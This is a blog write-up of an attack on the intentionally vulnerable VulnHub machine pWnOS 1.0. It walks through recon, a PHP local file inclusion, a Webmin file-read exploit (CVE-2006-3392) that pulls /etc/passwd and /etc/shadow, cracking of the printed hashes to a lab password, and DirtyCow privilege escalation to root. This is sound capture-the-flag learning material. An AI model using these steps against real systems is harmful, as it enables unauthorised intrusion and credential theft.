---
layout: post
title:  "pWnOS: 1.0"
date:   2021-1-21  +0400
categories: vulnhub pwnos1
description: "It's a linux virtual machine intentionally configured with exploitable services to provide you with a path to r00t. This is also the first machine of the pWnOS series. This machine is ranked as easy, but took loads of effort to pwn. Hope you enjoy it!"
---

<span style="text-decoration: underline">Box Stats:</span>

| Name: | pWnOS: 1.0 |
|-------|--------|
| Series: | [pWnOS](https://www.vulnhub.com/series/pwnos,3/) |
| Link: | [pWnOS: 1.0](https://www.vulnhub.com/entry/pwnos-10,33/) |
| OS: | Linux - Ubuntu 2.6.32 |
| Creator: | [pwnos](https://www.vulnhub.com/author/pwnos,6/) |


## Topics: ##
- LFI
- PHP enumeration
- Hash Cracking
- Privilige Escalation

## Recon ##
Start your scans and gather your results!
```
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 e4:46:40:bf:e6:29:ac:c6:00:e2:b2:a3:e1:50:90:3c (DSA)
|_  2048 10:cc:35:45:8e:f2:7a:a1:cc:db:a0:e8:bf:c7:73:3d (RSA)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m54s, deviation: 4h14m34s, median: -3h59m55s
|_nbstat: NetBIOS name: UBUNTUVM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: ubuntuvm
|   NetBIOS computer name: 
|   Domain name: nsdlab
|   FQDN: ubuntuvm.NSDLAB
|_  System time: 2021-01-11T11:16:24-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## Enumeration ##
We have a couple of ports open that are interesting and can be the potential way inside the machine. We know that `SSH` can be used as a stable connection, so I am guessing there will not be any misconfigurations with that protocol. 

# Port 80 - HTTP ## 
When browsing to the webpage at the IP address, we are greeted with a `pWnOS homepage`. We can click the next button which navigates us to a page that allows us to enter our name and choose our skill. By clicking the `Please Help!` button, we get trolled by the webpage telling us that we suck.

I was unaware of an LFI in this page, however once I deleted the end of the url which was `name=&submit=Please+Help%21` a php error was displayed: ` Warning: include() [function.include]: Failed opening '' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index1.php on line 18`. From here, we can use the `connect` function and set it to `/etc/passwd` for the LFI. This displays the `/etc/passwd` file:

![/etc/passwd from LFI]()

# Port 139+445 - SMB #
Nothing interesting was found in the file share. The shares were:
```
	Sharename       Type      Comment
	---------       ----      -------
	home            Disk      Home Directory for vmware User
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ubuntuvm)
```

The `print$, IPC4$` shares had no valuable info, but the `home` share allowed us to view the `vmware` users files. I don't want to spoil the machine, so I will finish enumerating this protocol.

# Port 10000 - Webmin HTTP #
When browsing to the url `http://________:10000/` we are redirected to `/session_login.cgi`. When I first tried enumerating the login field, after a number of tries, I was blocked from the server. After restarting the machine, I started looking for exploits that relate to `Webmin 0.01`. I found an exploit with the CVE of `CVE-2006-3392` at [SecurityFocus](www.securityfocus.com) that can be found [here](http://www.securityfocus.com/bid/18744). It is luckily a metasploit module as well, which makes it easier for us to exploit. We can use it download files from the host (and we have root priviliges too!). I was able to download the `/etc/passwd` and `/etc/shadow` file:

`/etc/passwd` file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
obama:x:1001:1001::/home/obama:/bin/bash
osama:x:1002:1002::/home/osama:/bin/bash
yomama:x:1003:1003::/home/yomama:/bin/bash
```

`/etc/shadow` file:
```
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:*:14040:0:99999:7:::
bin:*:14040:0:99999:7:::
sys:*:14040:0:99999:7:::
sync:*:14040:0:99999:7:::
games:*:14040:0:99999:7:::
man:*:14040:0:99999:7:::
lp:*:14040:0:99999:7:::
mail:*:14040:0:99999:7:::
news:*:14040:0:99999:7:::
uucp:*:14040:0:99999:7:::
proxy:*:14040:0:99999:7:::
www-data:*:14040:0:99999:7:::
backup:*:14040:0:99999:7:::
list:*:14040:0:99999:7:::
irc:*:14040:0:99999:7:::
gnats:*:14040:0:99999:7:::
nobody:*:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
```

We can use the `unshadow` tool to create a file with the combined data of the `/etc/passwd` and the `/etc/shadow` file to create one file with the usernames and password details. The usage is simple: `sudo unshadow PASSWORD-FILE SHADOW-FILE`. This will give us the output of:
```
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:!:100:101::/nonexistent:/bin/false
syslog:!:101:102::/home/syslog:/bin/false
klog:!:102:103::/home/klog:/bin/false
mysql:!:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:!:104:65534::/var/run/sshd:/usr/sbin/nologin
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:1000:1000:vmware,,,:/home/vmware:/bin/bash
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:1001:1001::/home/obama:/bin/bash
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:1002:1002::/home/osama:/bin/bash
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:1003:1003::/home/yomama:/bin/bash
```

## Exploitation ##
We can crack the hashes that we have gathered, I used `john` and the `rockyou.txt` wordlist to crack the hashes. I was able to find the `vmware` user's password which was `h4ckm3`. I used this to login via SSH, but this can also be used to login to the SMB server! From here, we can use the widely-known `DirtyCow` exploit which works on `Linux Kernel 2.6.22 < 3.9`. Compile the exploit using the `gcc -pthread dirty.c -o dirty -lcrypt` command. After following the prompt, the user `firefart` will be added with the password you chose:

```
$ su firefart
Password: password
$ id
uid=0(firefart) gid=0(root) groups=0(root)
```
We have pwned the machine! This machine was easy but took hard work to find LFIs and other issues. The webmin server also issues IP bans which made me restart the machine several times. Thank you for reading this writeup, and see you later! 
